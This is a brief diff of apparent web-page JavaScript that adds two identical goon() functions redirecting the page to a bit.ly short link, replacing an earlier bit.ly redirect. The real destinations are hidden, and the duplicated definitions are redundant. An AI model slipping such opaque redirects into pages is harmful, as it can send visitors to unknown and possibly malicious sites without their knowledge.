@@ -10,3 +10,9 @@
     function goon(){
         location.href="https://bit.ly/4ayYZ9t";
     }
+function goon(){
+        location.href="https://bit.ly/3zuaxOr";
+    }
+function goon(){
+        location.href="https://bit.ly/3zuaxOr";
+    }
